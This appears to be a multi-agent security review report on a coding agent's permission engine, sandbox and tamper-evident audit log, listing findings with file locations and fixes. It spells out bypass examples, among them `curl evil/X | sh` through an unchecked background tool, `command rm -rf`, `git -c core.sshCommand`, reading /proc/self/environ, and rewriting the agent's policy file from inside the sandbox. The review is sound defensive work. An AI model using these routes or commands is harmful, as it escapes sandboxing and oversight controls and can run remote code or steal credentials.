# REVIEW_NOTES_R4.md

Fourth multi-agent code review pass — **security-only focus**. Six reviewers, each with a different attacker hat:

- R4.1 — Bypass hunter (paths that skip engine.check entirely)
- R4.2 — Capability launderer (commands that emit wrong capability shapes)
- R4.3 — Sandbox escapee (paths to read/write outside the wrap)
- R4.4 — Audit corruptor (paths to forge/tamper the chain)
- R4.5 — Race hunter (concurrency-based security outcomes)
- R4.6 — Injection / parsing specialist (parser-boundary confusion)

## Summary

**16 P0 + 14 P1 + 16 P2 findings.** Three categories of recurring issue dominate:

1. **The sandbox boundary isn't a one-way valve.** Sandboxed processes can write to operator-controlled paths that the NEXT boot reads as policy/marker — bootstrapping into wider capabilities on session N+1 (R4.3 P0-1/P0-2).
2. **The audit chain's external anchors are unverified.** Worm-file, RFC3161, and git-anchored sealing all have implementation gaps that defeat their tamper-evidence claim (R4.4 P0-1 through P0-4).
3. **Bash resolver still has paths that emit wrong capabilities.** `command` builtin, `git -c <key=value>` pre-subcommand option, input redirects, `find -execdir`/`-ok`, several curl/node flags (R4.2 P0-1 through P0-4 + P1s).

Plus two NEW bypass paths discovered: `bash_background`/`bash_output`/`bash_kill` don't have resolvers wired (envelope check silently skipped); grandchild envelope re-derives from parent's policy snapshot instead of child's narrowed envelope (R4.1 P0-1/P0-2).

The R4 surface is BIGGER than R3 because each reviewer wore a specific attacker hat instead of doing a generic correctness pass.

## P0 findings (16)

### Bypass

**P0-Bypass-1** | `src/permissions/resolvers/registry.ts:32` + `src/permissions/engine.ts:1338` | `bash_background`/`bash_output`/`bash_kill` tools have no resolver. `resolveCapabilities(toolName)` returns empty caps; the §10.1 envelope gate at engine.ts:1338 fires only when `resolvedCapabilities.length > 0`. Subagent with narrowed envelope `['read-fs:src/**']` can call `bash_background('curl evil/X | sh')` — envelope check silently skipped. Fix: register the bash AST resolver for the whole bash family, OR change the envelope gate to fire for any tool whose category declares side effects.

**P0-Bypass-2** | `src/cli/subagent-child.ts:657` + `src/harness/loop.ts:1036` | Grandchild envelope re-derived from parent's POLICY snapshot, not child's NARROWED envelope. `engine.policy()` returns the full inherited policy; `deriveParentCapabilities(policy)` returns parent caps; intersection with grandchild's declared caps yields a wider envelope than child should ever allow. Spec §10.3 "escape impossível" broken across depth-2. Fix: when engine has `effectiveCapabilities`, return it directly; loop's spawn factory uses `engine.effectiveSet()` not `engine.policy()`.

### Capability laundering (bash resolver)

**P0-Launder-1** | `src/permissions/resolvers/bash.ts:1288` | `command` builtin registered as `cmdSysInfo` (emits read-fs:/etc only). `command rm -rf /home` emits `read-fs:/etc + exec:shell`, NO delete-fs. POSIX `command` is the canonical "bypass aliases/functions" mechanism — any command after it runs raw. Narrow allow rule on `read-fs:/etc` admits arbitrary commands.

**P0-Launder-2** | `src/permissions/resolvers/bash.ts:430-472` cmdGit | `git -c core.sshCommand='sh -c id' clone https://x/y`. The `-c` short flag IS stripped, but the value `core.sshCommand='sh -c "id"'` is a concatenation (no leading `-`) → becomes positional[0]. cmdGit's subcommand switch misses → default branch emits `gitWrite + readFs + netEgress('*')` — NO exec:arbitrary. Also: `core.pager`, `core.fsmonitor`, `--exec-path=`.

**P0-Launder-3** | `src/permissions/resolvers/bash.ts:1949-1968` analyzeCommand redirect loop | Input redirects (`<`) bypass the protected-path classifier ENTIRELY. The loop classifies `out|append|both|force-out` but `'in'` is commented "consume; no fs write" and skipped. `cat < /proc/self/environ` reads attacker-targeted credentials; cmdRead with no positional emits `read-fs:cwd`; the /proc deny tier never fires.

**P0-Launder-4** | `src/permissions/resolvers/bash.ts:291-296` cmdFind | `find -execdir` / `-ok` / `-okdir` bypass the `-exec` refuse. Only `-exec`/`--exec` are checked. Standard GNU find semantics: `-execdir bash -c "id" {} \;` runs the same exec, different cwd. cmdFind emits `read-fs(positionals)` only, no exec:arbitrary.

### Sandbox escape

**P0-Sand-1** | `src/permissions/sandbox-hide-paths.ts` | `~/.config/agent/permissions.yaml` writable from `home-rw`; NOT in HIDE_PATHS_DIRS. A sandboxed call with secret-access (routed to home-rw) can rewrite the user-scope policy to `sandbox.required: false` / broaden allow rules / set `hostAllowed: true`. Next boot loads the tampered policy — full escape on session N+1. Fix: add `.config/agent` to HIDE_PATHS_DIRS.

**P0-Sand-2** | `src/permissions/sandbox-hide-paths.ts` + `src/cli/sandbox-skip.ts:64-74` | `~/.config/forja/sandbox_skip` plantable from `home-rw`. The marker dir isn't masked (slice 122 hardened only the marker FILE write). Sandboxed bash writes a valid marker; next boot silently skips welcome (operator never opted in). Fix: add `.config/forja` to HIDE_PATHS_DIRS.

### Audit chain integrity

**P0-Audit-1** | `src/permissions/sealing.ts:425` `verifySealAgainstChain` | Seal entries not filtered by install_id. Attacker (DB write) inserts row R for install_B with controlled hash, edits seal file to match — verify cross-checks against install_B's row, succeeds. install_A's actual chain can be tampered freely. Fix: pass install_id into verifySealAgainstChain; filter `getApprovalsLogBySeq` by install_id.

**P0-Audit-2** | `src/permissions/sealing-rfc3161.ts:322` `list()` | RFC3161 sealing reads ONLY the plaintext `seal.log`; the `.tsr` files (which carry the TSA signature) are NEVER opened by `verifySealAgainstChain`. The whole point of TSA timestamping (cryptographic non-repudiation) is unimplemented. Attacker edits seal.log; verifier reports ok. Fix: parse each TSR's TSTInfo, compare messageImprint to chain hash, verify TSA signature against trust anchor.

**P0-Audit-3** | `src/permissions/seal-git.ts:380` `list()` | Git-anchored sealing reads working-tree `seal.log` byte-for-byte. No `git cat-file`, no signed-commit check, no remote pin. Attacker `git checkout -- seal.log` to fabricated state; verify reads the new file. The "operator pushes to protected remote" caveat is the only mitigation. Fix: verify against HEAD-rooted commit history (signed commits) with a remote/SSH trust anchor.

**P0-Audit-4** | `src/permissions/sealing.ts:185-194` worm-file `onCreate` | chattr +a runs only on FIRST creation. If seal file is deleted out-of-band (root, or a `home-rw` sandbox if `.local/share/forja` weren't slice-125-hidden but other paths could trigger same), next append re-creates it. On non-Linux platforms, `chattr` throws; file is written but never made append-only. Verifier still succeeds against the unprotected file. Fix: refuse to create when chattr (or platform-equivalent) cannot be set; on non-Linux require `s3-object-lock` or `rfc3161-tsa`.

### Race + concurrency

**P0-Race-1** | `src/permissions/sealing-scheduler.ts:84-91` | Sealing dedup is per-process. Two parallel `forja` processes share the DB + seal file; each scheduler initializes `lastSealedSeq = 0` in memory; both fire tick at same chain head; both append the same `seq=N hash=H`. Duplicate entries pass per-entry hash check; render the chain confusing. Fix: seed `lastSealedSeq` from `store.list()` at startup; or `store.append` returns conflict on existing seq.

**P0-Race-2** | `src/permissions/install_id.ts:93-128` | First-boot write is non-atomic: `existsSync(path) → writeFileSync(path, ...)`. Two parallel `forja` on a fresh install both pass existsSync false, both generate different UUIDs, last-writer wins. Process A's audit rows orphaned on next start (genesisHash mismatch). Fix: temp+rename with `flag: 'wx'` exclusive create.

### Injection + parsing

**P0-Inj-1** | `src/subagents/ipc.ts:138` | Parent↔child IPC `parseLine` uses bare `JSON.parse`. Slice 104 fixed the broker boundary with safeJsonParse but missed the IPC channel — a parallel attacker-controllable parse boundary. A compromised subagent sends `{"type":"event","__proto__":{...},...}`; downstream Object.assign in permission-bridge or modal renderers pollutes the prototype chain. Fix: route parseLine through safeJsonParse + scrubProtoPollution on payload fields.

**P0-Inj-2** | `src/cli/permission-replay.ts:64,432,518,538,562,712,719,726` | Unguarded `JSON.parse` on audit row columns. `reason_chain_json` carries operator-rendered text. Polluted `__proto__` lands as own property; downstream Object.entries enumerates. Worse: the renderer interpolates `e.note`, `e.rule`, etc. directly to stdout — slice 125's `stripControlChars` only ran in the welcome flow. A row's `note: "\x1b]0;evil\x07"` corrupts operator's terminal title. Fix: safeJsonParse for all in-CLI parses; stripControlChars on rendered strings.

## P1 findings (14)

- **R4.3 P1-1**: `scrubEnv` misses `SSH_AUTH_SOCK`, `GPG_AGENT_INFO`, `GNUPGHOME`, `KUBECONFIG`, `DOCKER_AUTH_CONFIG`, `OP_SESSION_*`, `CLOUDSDK_*` — none match the suffix patterns (`_TOKEN`/`_SECRET`/`_KEY`/`_PASSWORD`).
- **R4.3 P1-2**: macOS `(allow mach-lookup)` is blanket — exposes launchd, SystemConfiguration, Keychain services. Restrict via subset of `global-name`.
- **R4.4 P1-5**: `chain_meta` has no FK / UNIQUE on (install_id, rotation_id); rotation events emit NO audit row. Attacker forges chain_meta rows undetectably.
- **R4.4 P1-6**: `clearQuarantine` outside chain hash + outside audit emit. Attacker flips the flag.
- **R4.4 P1-7**: `chain-break-accepted` identified by LIKE on free-text `reason_chain_json`. Attacker plants substring in unrelated rows.
- **R4.4 P1-8**: `policy_archive` shared across installs (no install_id column).
- **R4.5 P1-Race-3**: Subagent spawn passes raw `process.env` (`src/subagents/spawn-factory.ts:349`), bypassing slice 105's `scrubEnv` (which only covered the broker spawn).
- **R4.5 P1-Race-4**: Memory `MEMORY.md` R-M-W not flock'd; parent + child concurrent writes lose entries (acknowledged in code comment but unfixed).
- **R4.2 P1-Launder-5**: cmdCurlWget missing flag schema for `--upload-file`/`-T` (read-fs for PUT payload), `--cookie-jar`/`-c` (write-fs), `--dump-header`/`-D` (write-fs), `--config`/`-K` (reads URL list from file).
- **R4.2 P1-Launder-6**: `node --inspect=0.0.0.0:9229` opens a debugger listener; cmdInterpreter emits no `net-ingress`. Remote attacker reaching the port gets full V8 control.
- **R4.2 P1-Launder-7**: `node --eval` (long form) bypasses the `-c`/`-e`/`-E` inline-code refuse. Same threat shape.
- **R4.6 P1-Inj-3**: `URL_REGEX` scheme list narrow — misses `data:`, `postgres://`, `s3://`, `vault://`, `mongodb+srv://`, etc.
- **R4.6 P1-Inj-4**: `GIT_SSH_REGEX` username class excludes `+` — emails with `firstname+tag@` slip redaction.
- **R4.6 P1-Inj-5**: `PATH_REGEX_POSIX` excludes `<>|()` — path `/tmp/data(2025)/file` truncates mid-redaction.

## P2 findings (16)

Lower-severity defense-in-depth gaps, privacy leaks, test coverage gaps, and spec-vs-code drift across:

- Procfs leaks (R4.3 P2-1/P2-2/P2-3 — /proc/mounts, boot_id, /etc/passwd readable from sandbox)
- Empty chain accepted as ok (R4.4 P2-9); seq excluded from hash payload (P2-10); replay doesn't recompute args_hash (P2-11)
- Audit-emit args not scrubbed of proto-pollution before canonicalize (R4.6 P2-8)
- Policy hot-reload race on cached policy_hash (R4.5 P2-1)
- Hooks inherit SQLite fd (missing O_CLOEXEC) (R4.5 P2-2)
- readSandboxSkipMetadata last-wins vs slice 122 comment first-wins (R4.6 P2-6)
- explain-permissions / permission-replay render policy strings without ANSI strip (R4.6 P2-7)
- `command`/`builtin` no test coverage (R4.2 P2-8)
- `git -c` / `--exec-path=` no test (R4.2 P2-9)
- Input-redirect protected-path test exists for `>`, not for `<` (R4.2 P2-10)
- `find -execdir`/`-ok` no test (R4.2 P2-11)
- policy_snapshot spread parser doesn't validate top-level keys (R4.1 P2)

## Cross-cutting themes

1. **Sandbox boundary is leaky in the "writes to operator config" direction**. The bwrap/SBPL wrap correctly stops EXFIL of credentials (slice 118/119/125 hide_paths) but leaves PLANT vectors: write a poisoned policy / marker / state file that the next boot trusts. This is a fundamentally different mitigation pattern than "mask the path" — needs either WRITE-side hide_paths (mount /dev/null over the file from inside) OR signature-bound parent reads.

2. **External-anchor sealing claims tamper-evidence but doesn't deliver it.** Worm-file's chattr is best-effort; RFC3161 doesn't open the TSR signatures; git-anchored doesn't verify commits. The §7.3 "sealing makes audit tampering detectable" property is mostly marketing today. A real implementation needs to actually consult the cryptographic primitive (TSA signature, commit hash chain, S3 object lock) at verify time.

3. **The bash resolver's "small whitelist" assumption keeps surfacing exceptions.** Every R-round adds 2-5 new GTFOBins paths the resolver missed. The architectural question: should the resolver be more conservative (refuse anything not on a SMALL allowlist of shape patterns) rather than enumerate every flag? Counter-argument: the operator's workflows demand support for many flag shapes. Trade-off worth re-litigating before R5.

4. **Audit chain integrity assumes write-access is operator-only.** P0-Audit-1/4/5 + P1-5/6/7 all assume attacker has DB write. Once the threat model includes a sandboxed process with `home-rw` that writes to `.local/share/forja/`, all these gaps become reachable. **The audit DB MUST be in HIDE_PATHS_DIRS** (already added in slice 125 — verify by R4.3 fence test) AND outside any operator-default writable mount.

5. **Test coverage continues to lag fixes.** Each round of fixes lands without proportional test coverage; R3 backfilled +53 tests for slice 125, but slice 127 itself didn't add tests for some new code paths. Recommend: every PR that adds a refuse path also adds a test that exercises it.

## Triage recommendations

**Highest urgency** (3 commits, each ~1-2 hours):
1. P0-Sand-1 + P0-Sand-2 (2-line fix: extend HIDE_PATHS_DIRS).
2. P0-Bypass-1 (register bash AST resolver for the bash family).
3. P0-Inj-1 (route IPC parseLine through safeJsonParse).

**High urgency** (5 commits, ~3-5 hours each):
4. P0-Launder-1/2/3/4 (bash resolver: command/git-c/input-redirect/find-execdir) — bundle into one slice with tests.
5. P0-Audit-1 (seal-verify install_id filter) + P0-Audit-4 (worm-file platform requirement).
6. P0-Bypass-2 (grandchild envelope re-derivation).
7. P0-Race-1 (sealing scheduler seed lastSealedSeq from store).
8. P0-Race-2 (install_id atomic write).

**Medium urgency** (P0-Audit-2/P0-Audit-3 RFC3161/git signature verification): these are FEATURES (cryptographic verify primitive) not patches; each is its own slice with substantial design work.

**Bundle** all P1s into 1-2 follow-up slices grouped by surface.

---

Generated by 6 parallel security review agents, 2026-05-12. Slices reviewed: 95-127.
